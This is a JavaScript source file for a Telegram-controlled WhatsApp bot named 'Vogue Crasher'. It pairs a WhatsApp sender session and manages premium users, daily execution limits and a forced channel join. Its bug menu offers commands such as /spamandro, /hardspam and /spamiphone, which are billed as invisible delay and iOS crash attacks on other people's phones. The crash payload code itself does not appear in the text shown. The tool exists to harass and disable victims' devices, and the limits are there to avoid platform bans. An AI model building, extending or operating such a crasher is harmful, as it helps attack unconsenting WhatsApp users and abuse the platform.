//     _____ _____ _   _ ______ _____ _____ 
//    /  __ \  _  | \ | ||  ___|_   _|  __ \
//    | /  \/ | | |  \| || |_    | | | |  \/
//    | |   | | | | . ` ||  _|   | | | | __ 
//    | \__/\ \_/ / |\  || |    _| |_| |_\ \
//     \____/\___/\_| \_/\_|    \___/ \____/
//                                          
//                                          
//     _   _  ___  ______                   
//    | | | |/ _ \ | ___ \                  
//    | | | / /_\ \| |_/ /                  
//    | | | |  _  ||    /                   
//    \ \_/ / | | || |\ \                   
//     \___/\_| |_/\_| \_|                  
//                                          
//                                          
//     _____ _____ _   _______ ___________  
//    /  ___|  ___| \ | |  _  \  ___| ___ \ 
//    \ `--.| |__ |  \| | | | | |__ | |_/ / 
//     `--. \  __|| . ` | | | |  __||    /  
//    /\__/ / |___| |\  | |/ /| |___| |\ \  
//    \____/\____/\_| \_/___/ \____/\_| \_| 
//                                          
//                                          

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process')
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const FormData = require("form-data");
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm')
const os = require('os')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    BufferJSON,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
    const ev = new EventEmitter()
    
    let chats = {}
    let messages = {}
    let contacts = {}
    
    ev.on('messages.upsert', ({ messages: newMessages, type }) => {
        for (const msg of newMessages) {
            const chatId = msg.key.remoteJid
            if (!messages[chatId]) messages[chatId] = []
            messages[chatId].push(msg)
            
            if (messages[chatId].length > 100) {
                messages[chatId].shift()
            }
            
            chats[chatId] = {
                ...(chats[chatId] || {}),
                id: chatId,
                name: msg.pushName,
                lastMsgTimestamp: +msg.messageTimestamp
            }
        }
    })
    
    ev.on('chats.set', ({ chats: newChats }) => {
        for (const chat of newChats) {
            chats[chat.id] = chat
        }
    })
    
    ev.on('contacts.set', ({ contacts: newContacts }) => {
        for (const id in newContacts) {
            contacts[id] = newContacts[id]
        }
    })
    
    return {
        chats,
        messages,
        contacts,
        bind: (evTarget) => {
            evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
            evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
            evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
        },
        logger
    }
}

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const thumbnailUrl = "https://files.catbox.moe/eyhahn.png";

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
const lastClaim = new Map();
const messageLog = new Map();
let restarting = false;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const requiredChannel = "@VogueOfficialx";
const premiumFile = './database/premium.json';
const premiumGroupFile = './database/premiumgroup.json';
const claimFile = './database/premium_claimed.json';
const activeAnimatedMenus = new Map();
const lockedMenus = new Set();
const styleCycle = ["primary", "success", "danger"];
let currentStyleIndex = 0;

const loadClaimed = () => {
    try {
        return JSON.parse(fs.readFileSync(claimFile));
    } catch {
        return {};
    }
};

const saveClaimed = (data) => {
    fs.writeFileSync(claimFile, JSON.stringify(data, null, 2));
};

const hasClaimedFreePremium = (userId) => {
    const data = loadClaimed();
    return !!data[userId];
};

const markClaimedFreePremium = (userId) => {
    const data = loadClaimed();
    data[userId] = true;
    saveClaimed(data);
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

if (!fs.existsSync(premiumGroupFile)) {
    fs.writeFileSync(
        premiumGroupFile,
        JSON.stringify([], null, 2)
    );
}

function loadPremiumGroups() {
    return JSON.parse(
        fs.readFileSync(premiumGroupFile)
    );
}

function savePremiumGroups(data) {
    fs.writeFileSync(
        premiumGroupFile,
        JSON.stringify(data, null, 2)
    );
}

function isPremiumGroup(chatId) {
    const groups = loadPremiumGroups();
    return groups.includes(chatId.toString());
}

function checkPremiumAccess(ctx, next) {
    
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id.toString();
    
    const premiumUsers = loadPremiumUsers();
    
    const userPremium =
        premiumUsers[userId];
    
    const groupPremium =
        isPremiumGroup(chatId);
    
    if (userPremium || groupPremium) {
        return next();
    }
    
    return ctx.reply(
        `Access Denied

This feature is restricted to premium users or premium groups.`
    );
}

// ========================================
// SOCKET STABILITY SYSTEM
// ========================================

let reconnecting = false;
let pingInterval = null;
let reconnectTimeout = null;
let socketStarted = false;

function clearSocketIntervals() {

    if (pingInterval) {
        clearInterval(pingInterval);
        pingInterval = null;
    }

    if (reconnectTimeout) {
        clearTimeout(reconnectTimeout);
        reconnectTimeout = null;
    }
}

async function destroySocket() {

    try {

        clearSocketIntervals();

        if (sock?.ws) {
            try {
                sock.ws.close();
            } catch {}
        }

        try {
            sock.end();
        } catch {}

        try {
            sock.ev.removeAllListeners();
        } catch {}

    } catch (e) {}
}

const startSesi = async () => {
    console.clear();
    console.log(chalk.bold.yellow(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀


» Information:
  Developer: Prince
  Version: 1.0 Pro
  Status: Bot Connected
  `))
    
    const store = makeInMemoryStore({
        logger: require('pino')().child({ level: 'silent', stream: 'store' })
    })
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();
    
    const connectionOptions = {
        version,
        keepAliveIntervalMs: 10000,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        syncFullHistory: false,
        markOnlineOnConnect: true,
        fireInitQueries: false,
        generateHighQualityLinkPreview: false,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: [
            'Ubuntu',
            'Chrome',
            '22.04.4'
        ]
    };
    sock = makeWASocket(connectionOptions);
    
    // ========================================
    // ANTI TIMEOUT HEARTBEAT
    // ========================================
    
    clearSocketIntervals();
    
    pingInterval = setInterval(() => {
    
        try {
    
            if (
                sock &&
                sock.ws &&
                sock.ws.readyState === 1
            ) {
    
                sock.ws.send(
                    JSON.stringify({
                        type: "ping"
                    })
                );
    
                console.log(
                    "[VOGUE] Heartbeat Ping"
                );
            }
    
        } catch {}
    
    }, 15000);
    
    sock.ev.on("messages.upsert", async ({ messages }) => {
        
        const msg = messages[0];
        
        if (!msg.message) return;
        
        const sender = msg.key.remoteJid;
        
        messageLog.set(sender, {
            id: msg.key.id,
            sender: sender,
            pushName: msg.pushName || "Unknown",
            text: msg.message.conversation ||
                msg.message.extendedTextMessage?.text ||
                "[MEDIA/OTHER]",
            timestamp: msg.messageTimestamp,
            type: Object.keys(msg.message)[0]
        });
        
    });
    
    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            reconnecting = false;
            socketStarted = true;
            clearSocketIntervals();
            if (lastPairingMessage) {
                const connectedMenu = `
<pre>
VOGUE CRASH • PAIRING SYSTEM
────────────────────────────

Session Information

Client Name   : Vogue Crasher
Developer     : @ScriptKits
Version       : 1.0
Prefix        : /

────────────────────────────

Registered Number :
${lastPairingMessage.phoneNumber}

Pairing Code :
${lastPairingMessage.pairingCode}

Connection Status Connected and Operational

──────────────────────────────
The sender session has been successfully initialized and is ready for use.
</pre>`;
                
                try {
                    bot.telegram.editMessageCaption(
                        lastPairingMessage.chatId,
                        lastPairingMessage.messageId,
                        undefined,
                        connectedMenu, { parse_mode: "HTML" }
                    );
                } catch (e) {}
            }
            
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
▒█░░▒█ ▒█▀▀▀█ ▒█▀▀█ ▒█░▒█ ▒█▀▀▀ 
░▒█▒█░ ▒█░░▒█ ▒█░▄▄ ▒█░▒█ ▒█▀▀▀ 
░░▀▄▀░ ▒█▄▄▄█ ▒█▄▄█ ░▀▄▄▀ ▒█▄▄▄ 

▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█ 
▒█░░░ ▒█▄▄▀ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀ 
▒█▄▄█ ▒█░▒█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
» Information:
  Developer: Prince
  Version: 1.0 Pro
  Status: Sender Connected
  `))
            pingInterval = setInterval(() => {
                try {
            
                    if (
                        sock &&
                        sock.ws &&
                        sock.ws.readyState === 1
                    ) {
            
                        sock.sendPresenceUpdate("available");
            
                        console.log(
                            "[VOGUE] Presence KeepAlive"
                        );
                    }
            
                } catch {}
            
            }, 20000);
        }
        
        if (connection === 'close') {
    
            isWhatsAppConnected = false;
            
            const statusCode =
                lastDisconnect?.error?.output?.statusCode;
            
            const shouldReconnect =
                statusCode !== DisconnectReason.loggedOut;
            
            console.log(
                chalk.red(`
        [VOGUE SOCKET CLOSED]
        
        Status Code : ${statusCode}
        Reconnect   : ${shouldReconnect}
        `)
            );
            
            if (!shouldReconnect) {
                
                console.log(
                    chalk.red(
                        "Session logged out."
                    )
                );
                
                return;
            }
            
            // ========================================
            // ANTI MULTIPLE RECONNECT
            // ========================================
            
            if (reconnecting) return;
            
            reconnecting = true;
            
            reconnectTimeout = setTimeout(async () => {
                
                try {
                    
                    console.log(`
        [VOGUE RECONNECT]
        
        Destroying old socket...
        `);
                    
                    await destroySocket();
                    
                    console.log(`
        [VOGUE RECONNECT]
        
        Starting fresh session...
        `);
            
            reconnecting = false;
            
            startSesi();
            
        } catch (err) {
            
            reconnecting = false;
            
            console.log(
                `[RECONNECT ERROR] ${err.message}`
            );
        }
        
    }, 5000);
}
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

//     _____  _   _   ___   _   _  _   _  _____ _     
//    /  __ \| | | | / _ \ | \ | || \ | ||  ___| |    
//    | /  \/| |_| |/ /_\ \|  \| ||  \| || |__ | |    
//    | |    |  _  ||  _  || . ` || . ` ||  __|| |    
//    | \__/\| | | || | | || |\  || |\  || |___| |____
//     \____/\_| |_/\_| |_/\_| \_/\_| \_/\____/\_____/
//                                                    
//                                                    
//     _______   _______ _____ ________  ___          
//    /  ___\ \ / /  ___|_   _|  ___|  \/  |          
//    \ `--. \ V /\ `--.  | | | |__ | .  . |          
//     `--. \ \ /  `--. \ | | |  __|| |\/| |          
//    /\__/ / | | /\__/ / | | | |___| |  | |          
//    \____/  \_/ \____/  \_/ \____/\_|  |_/          
//                                                    
//                                                    

const REQUIRED_CHANNELS = [
    "@VogueOfficialx"
];

async function checkChannelMembership(ctx) {

    try {

        const notJoined = [];

        for (const channel of REQUIRED_CHANNELS) {

            try {

                const member =
                    await ctx.telegram.getChatMember(
                        channel,
                        ctx.from.id
                    );

                const status = member.status;

                const allowed = [
                    "creator",
                    "administrator",
                    "member"
                ];

                if (!allowed.includes(status)) {
                    notJoined.push(channel);
                }

            } catch {

                notJoined.push(channel);
            }
        }

        if (notJoined.length > 0) {

            const buttons = [];

            // CHANNEL BUTTONS
            for (const channel of REQUIRED_CHANNELS) {

                buttons.push([
                    {
                        text: `Join ${channel}`,
                        url: `https://t.me/${channel.replace("@", "")}`
                    }
                ]);
            }

            // CHECK BUTTON
            buttons.push([
                {
                    text: "I've Joined",
                    callback_data: "recheck_join"
                }
            ]);

            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption:
`<pre>
V O G U E  •  V E R I F I C A T I O N
──────────────────────────

Access Denied

Before using this bot,
you must join all required
Telegram channels first.

Required Channels:

${REQUIRED_CHANNELS.join("\n")}

──────────────────────────
After joining all channels,
press the verification button below.
</pre>`,
                    parse_mode: "HTML",

                    reply_markup: {
                        inline_keyboard: buttons
                    }
                }
            );

            return false;
        }

        return true;

    } catch (err) {

        console.log(
            `[JOIN CHECK ERROR] ${err.message}`
        );

        return false;
    }
}

bot.use(async (ctx, next) => {

    if (ctx.from?.id == ownerID) {
        return next();
    }

    if (!ctx.from) {
        return;
    }

    const allowed =
        await checkChannelMembership(ctx);

    if (!allowed) {
        return;
    }

    return next();
});

bot.action(
    "recheck_join",
    async (ctx) => {

        const allowed =
            await checkChannelMembership(ctx);

        if (allowed) {

            await ctx.answerCbQuery(
                "Verification successful"
            );

            try {

                await ctx.deleteMessage();

            } catch {}

            return ctx.reply(
`Access Granted

You can now use the bot normally.`
            );
        }

        return ctx.answerCbQuery(
            "You have not joined all channels yet",
            {
                show_alert: true
            }
        );
    }
);

//     _     ________  ________ _____ 
//    | |   |_   _|  \/  |_   _|_   _|
//    | |     | | | .  . | | |   | |  
//    | |     | | | |\/| | | |   | |  
//    | |_____| |_| |  | |_| |_  | |  
//    \_____/\___/\_|  |_/\___/  \_/  
//                                    
//                                    
//     _   _ _____ ___________        
//    | | | /  ___|  ___| ___ \       
//    | | | \ `--.| |__ | |_/ /       
//    | | | |`--. \  __||    /        
//    | |_| /\__/ / |___| |\ \        
//     \___/\____/\____/\_| \_|       
//                                    
//                                    

const LIMIT_FILE =
    "./database/userlimit.json";

let userLimits = {};

if (fs.existsSync(LIMIT_FILE)) {

    userLimits =
        JSON.parse(
            fs.readFileSync(
                LIMIT_FILE
            )
        );
}

function saveLimits() {

    fs.writeFileSync(
        LIMIT_FILE,
        JSON.stringify(
            userLimits,
            null,
            2
        )
    );
}

function getToday() {

    return new Date()
        .toISOString()
        .split("T")[0];
}

function checkUserLimit(userId) {

    const today = getToday();

    if (!userLimits[userId]) {

        userLimits[userId] = {

            date: today,

            used: 0,

            bonus: 0
        };
    }

    // RESET HARIAN
    if (
        userLimits[userId].date !== today
    ) {

        userLimits[userId] = {

            date: today,

            used: 0,

            bonus:
                userLimits[userId]
                ?.bonus || 0
        };
    }

    // TOTAL LIMIT
    const maxLimit =
        15 +
        (
            userLimits[userId]
            .bonus || 0
        );

    // LIMIT HABIS
    if (
        userLimits[userId].used >=
        maxLimit
    ) {

        return {

            allowed: false,

            remaining: 0,

            used:
                userLimits[userId]
                .used,

            total:
                maxLimit
        };
    }

    return {

        allowed: true,

        remaining:
            maxLimit -
            userLimits[userId]
            .used,

        used:
            userLimits[userId]
            .used,

        total:
            maxLimit
    };
}


function addUserLimit(userId) {

    const today = getToday();

    if (!userLimits[userId]) {

        userLimits[userId] = {

            date: today,

            used: 0,

            bonus: 0
        };
    }

    // RESET HARIAN
    if (
        userLimits[userId].date !== today
    ) {

        userLimits[userId] = {

            date: today,

            used: 0,

            bonus:
                userLimits[userId]
                ?.bonus || 0
        };
    }

    userLimits[userId].used += 1;

    saveLimits();
}

function addBonusLimit(
    userId,
    amount
) {

    const today = getToday();

    if (!userLimits[userId]) {

        userLimits[userId] = {

            date: today,

            used: 0,

            bonus: 0
        };
    }

    if (
        !userLimits[userId].bonus
    ) {

        userLimits[userId].bonus = 0;
    }

    userLimits[userId].bonus += amount;

    saveLimits();
}

function removeBonusLimit(
    userId,
    amount
) {

    if (!userLimits[userId]) {
        return false;
    }

    if (
        !userLimits[userId].bonus
    ) {

        userLimits[userId].bonus = 0;
    }

    userLimits[userId].bonus -= amount;

    if (
        userLimits[userId].bonus < 0
    ) {

        userLimits[userId].bonus = 0;
    }

    saveLimits();

    return true;
}


async function checkExecutionLimit(
    ctx,
    next
) {

    if (ctx.from.id == ownerID) {
        return next();
    }

    const userId =
        String(ctx.from.id);

    const limit =
        checkUserLimit(userId);

    if (!limit.allowed) {

        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption:
`<pre>
V O G U E  •  C R A S H E R
──────────────────────────

Daily execution limit reached.

User        : ${ctx.from.first_name}
Limit       : ${limit.used} / ${limit.total}
Status      : Blocked

──────────────────────────
Limit will reset automatically tomorrow.
To avoid sender overload and ban risk.
</pre>`,
                parse_mode: "HTML",

                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "Developer",
                                url: "https://t.me/ScriptKits",
                                style: "danger"
                            }
                        ]
                    ]
                }
            }
        );
    }

    addUserLimit(userId);

    return next();
}

bot.command("addlimit", async (ctx) => {

    try {

        if (ctx.from.id != ownerID) {
            return ctx.reply("Owner only.");
        }

        const args = ctx.message.text.split(" ");

        let targetUserId;
        let targetName;
        let amount;

        if (ctx.message.reply_to_message) {

            targetUserId = String(
                ctx.message.reply_to_message.from.id
            );

            targetName =
                ctx.message.reply_to_message.from.first_name;

            amount = parseInt(args[1]);

        }

        else {

            if (!args[1] || !args[2]) {

                return ctx.reply(
`Usage:
/addlimit <id> <amount>

/addlimit 123456789 10

Or reply user:
/addlimit 10`
                );
            }

            targetUserId =
                args[1].replace("@", "");

            targetName = args[1];

            amount = parseInt(args[2]);
        }


        if (!amount || amount < 1) {
            return ctx.reply(
                "Invalid limit amount."
            );
        }

        addBonusLimit(
            targetUserId,
            amount
        );

        const data = checkUserLimit(
            targetUserId
        );

        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption:
`
<pre>
V O G U E • LIMIT MANAGER
────────────────────────

Status
Success

Target
${targetName}

User ID
${targetUserId}

Added Bonus
+${amount}

Current Limit
${data.used} / ${data.total}

────────────────────────
User limit updated successfully.
</pre>
`,
                parse_mode: "HTML"
            }
        );

    } catch (err) {

        console.log(err);

        return ctx.reply(
            "Failed to add limit."
        );
    }
});

bot.command("remlimit", async (ctx) => {

    try {

        if (ctx.from.id != ownerID) {
            return ctx.reply("Owner only.");
        }

        const args = ctx.message.text.split(" ");

        let targetUserId;
        let targetName;
        let amount;

        if (ctx.message.reply_to_message) {

            targetUserId = String(
                ctx.message.reply_to_message.from.id
            );

            targetName =
                ctx.message.reply_to_message.from.first_name;

            amount = parseInt(args[1]);

        }

        else {

            if (!args[1] || !args[2]) {

                return ctx.reply(
`Usage:
/remlimit <id> <amount>`
                );
            }

            targetUserId =
                args[1].replace("@", "");

            targetName = args[1];

            amount = parseInt(args[2]);
        }

        if (!amount || amount < 1) {
            return ctx.reply(
                "Invalid amount."
            );
        }

        const removed =
            removeBonusLimit(
                targetUserId,
                amount
            );

        if (!removed) {
            return ctx.reply(
                "User not found."
            );
        }

        const data = checkUserLimit(
            targetUserId
        );

        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption:
`
<pre>
V O G U E • LIMIT MANAGER
────────────────────────

Status
Success

Target
${targetName}

Removed Bonus
-${amount}

Current Limit
${data.used} / ${data.total}

────────────────────────
User bonus limit updated.
</pre>
`,
                parse_mode: "HTML"
            }
        );

    } catch (err) {

        console.log(err);

        return ctx.reply(
            "Failed to remove limit."
        );
    }
});

bot.command("checklimit", async (ctx) => {

    try {

        const args =
            ctx.message.text.split(" ");

        let targetUserId;
        let targetName;

        if (ctx.message.reply_to_message) {

            targetUserId = String(
                ctx.message.reply_to_message.from.id
            );

            targetName =
                ctx.message.reply_to_message.from.first_name;
        }

        else if (!args[1]) {

            targetUserId =
                String(ctx.from.id);

            targetName =
                ctx.from.first_name;
        }

        else {

            targetUserId =
                args[1].replace("@", "");

            targetName = args[1];
        }

        const data = checkUserLimit(
            targetUserId
        );

        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption:
`
<pre>
V O G U E • LIMIT CHECKER
────────────────────────

Target
${targetName}

User ID
${targetUserId}

Used
${data.used}

Remaining
${data.remaining}

Total
${data.total}

────────────────────────
Daily limit information.
</pre>
`,
                parse_mode: "HTML"
            }
        );

    } catch (err) {

        console.log(err);

        return ctx.reply(
            "Failed to check limit."
        );
    }
});

//     _____ _____ ___  ______ _____ 
//    /  ___|_   _/ _ \ | ___ \_   _|
//    \ `--.  | |/ /_\ \| |_/ / | |  
//     `--. \ | ||  _  ||    /  | |  
//    /\__/ / | || | | || |\ \  | |  
//    \____/  \_/\_| |_/\_| \_| \_/  
//                                   
//                                   
//    ______  _____ _____            
//    | ___ \|  _  |_   _|           
//    | |_/ /| | | | | |             
//    | ___ \| | | | | |             
//    | |_/ /\ \_/ / | |             
//    \____/  \___/  \_/             
//                                   
//                                   

bot.start(async (ctx) => {
    
    const menuMessage = `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

System Information

User        : ${ctx.from.first_name}
Developer   : @ScriptKits
Version     : 1.0 Pro
Prefix      : /
Framework   : Javascript

──────────────────────────
</pre>`;
    
    const keyboard = [
        [
            { text: "All Menu", callback_data: "/controls" },
            { text: "Bug Menu", callback_data: "/bug" }
        ],
        [
            { text: "Developer", callback_data: "/tqto" }
        ],
        [
            { text: "🎁 Free 1 Day Premium", callback_data: "free_premium_info" }
        ]
    ];
    
    const sent = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    
});


bot.action('/start', async (ctx) => {

    const menuMessage = `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

System Information

User        : ${ctx.from.first_name}
Developer   : @ScriptKits
Version     : 1.0 Pro
Prefix      : /

Description

This Telegram automation system is connected with WhatsApp session integration and advanced function execution modules.

All operations are monitored and executed through the central dispatch system.

──────────────────────────

Select one of the available options below to continue system interaction.
</pre>`;

    const keyboard = [
        [
            {
                text: "All Menu",
                callback_data: "/controls"
            },
            {
                text: "Bug Menu",
                callback_data: "/bug"
            }
        ],
        [
            {
                text: "Developer",
                callback_data: "/tqto"
            }
        ],
        [
            {
                text: "🎁 Free 1 Day Premium",
                callback_data: "free_premium_info"
            }
        ]
    ];

    try {

        const sent = await ctx.editMessageMedia(
            {
                type: 'photo',
                media: thumbnailUrl,
                caption: menuMessage,
                parse_mode: "HTML",
                message_effect_id: "5104841245755180586",
            },
            {
                reply_markup: {
                    inline_keyboard: keyboard
                }
            }
        );
        
        
    } catch (error) {

        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description ===
            "Bad Request: message is not modified"
        ) {

            await ctx.answerCbQuery();

        } else {

            console.log(
                `[START ERROR] ${error.message}`
            );
        }
    }
});

bot.action('free_premium_info', async (ctx) => {
    
    return ctx.editMessageCaption(
        `<pre>
V O G U E  •  C R A S H E R
──────────────────────────

FREE PREMIUM ACCESS

Reward      : 1 Day Premium
Condition   : Join Channel Required

──────────────────────────

You must join our channel to claim premium access.

After joining, press CHECK button.
</pre>`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Join Channel", url: `https://t.me/${requiredChannel.replace('@','')}` }
                    ],
                    [
                        { text: "Check Join", callback_data: "check_premium_join" }
                    ]
                ]
            }
        }
    );
});

bot.action('check_premium_join', async (ctx) => {
    
    const userId = ctx.from?.id;
    
    if (!userId) {
        return ctx.answerCbQuery("Invalid user context", { show_alert: true });
    }
    
    if (hasClaimedFreePremium(userId)) {
        return ctx.answerCbQuery(
            "You already used free premium permanently.", { show_alert: true }
        );
    }
    
    try {
        // 🔥 safety check channel format
        if (!requiredChannel.startsWith('@')) {
            throw new Error("Invalid channel format. Must be @username");
        }
        
        const member = await ctx.telegram.getChatMember(requiredChannel, userId);
        
        if (!member || member.status === "left" || member.status === "kicked") {
            return ctx.answerCbQuery("Join channel first.", { show_alert: true });
        }
        
        const expiry = addPremiumUser(userId, 1);
        
        markClaimedFreePremium(userId);
        
        return ctx.editMessageCaption(
            `<pre>
V O G U E  •  C R A S H E R
──────────────────────────

FREE PREMIUM GRANTED

User     : ${ctx.from.first_name}
Status   : ACTIVE (1 DAY)
Expiry   : ${moment(expiry).format("DD-MM-YYYY HH:mm")}

──────────────────────────
One-time reward activated.
</pre>`, { parse_mode: "HTML" });
        
    } catch (err) {
        console.log("CHECK PREMIUM ERROR:", err);
        
        // kasih error spesifik biar gampang debug
        return ctx.answerCbQuery(
            "Failed to verify channel membership.", { show_alert: true }
        );
    }
});


bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<pre>  
V O G U E  •  C R A S H E R  
──────────────────────────

CONTROL PANEL

User        : ${ctx.from.first_name}
Developer   : @ScriptKits
Version     : 1.0 Pro
Prefix      : /

──────────────────────────

OWNER MANAGEMENT

/reqpair
› Initialize a new WhatsApp sender session
/killsession
› Kill & Remove all sessions
/info
› Display full bot and VPS information
/restartbot
› Restart Bot
/update
› Update the script
/ping
› Check latency bot


──────────────────────────

PREMIUM MANAGEMENT

/addprem
› Grant premium access to a user
/delprem
› Revoke premium access from a user
/listprem
› Display all premium users

──────────────────────────

GROUP ACCESS MANAGEMENT

/addgrupremium
› Enable premium access for current group
/delgrupremium
› Remove premium access from current group

──────────────────────────

TOOLS MENU

/tourl
› Image, gif, and video convert to url
/sticker
› Convert image and video to Sticker

──────────────────────────

SYSTEM STATUS

› All services are operational
› Dispatch engine is active

──────────────────────────
</pre>`;
    
    
    const keyboard = [
        [
        {
            text: "Back To Menu",
            callback_data: "/start"
        }]
    ];
    
    try {
        
        await ctx.editMessageCaption(
            controlsMenu,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: keyboard
                }
            }
        );
        
    } catch (error) {
        
        try {
            await ctx.answerCbQuery();
        } catch {}
        
    }
    
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

BUG EXECUTION PANEL

User        : ${ctx.from.first_name}
Developer   : @ScriptKits
Version     : 1.0 Pro
Prefix      : /

──────────────────────────

A N D R O I D
/spamandro  : Hard Delay Invisible 70%
/hardspam   : Delay Hard Invisible 1000% (RISK)

──────────────────────────

I P H O N E 
/spamiphone : iOS Crash Invisible

──────────────────────────
</pre>`;
    
    const keyboard = [
        [
        {
            text: "Back",
            callback_data: "/start"
        }]
    ];
    
    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

ACKNOWLEDGEMENT PANEL

